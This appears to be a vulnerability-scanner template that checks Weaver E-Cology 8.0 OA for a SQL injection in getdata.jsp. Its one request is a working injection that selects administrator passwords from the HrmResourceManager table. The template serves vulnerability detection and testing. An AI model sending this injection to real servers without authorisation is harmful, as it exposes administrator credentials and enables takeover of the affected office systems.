id: FanWeiOA_E-Cology_getdata_SQL

info:
  name: 泛微OA E-Cology getdata.jsp SQL注入漏洞
  author: zan8in
  severity: high
  description: |
    泛微新一代移动办公平台e-cology8.0不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology v8.0平台存在SQL注入漏洞，攻击者通过漏洞可以获取业务后台权限。
    app="泛微-协同办公OA"
  reference:
    - https://mp.weixin.qq.com/s/UChF75SBwa-B2vnUpzKMnw

rules:
  r0:
    request:
      method: GET
      path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
    expression: response.status == 200 && response.body.bcontains(b'<BODY>\r\n<pre>\r\n<code>')&& response.body.bcontains(b'</code>\r\n</pre>\r\n</BODY>\r\n</HTML>')
expression: r0()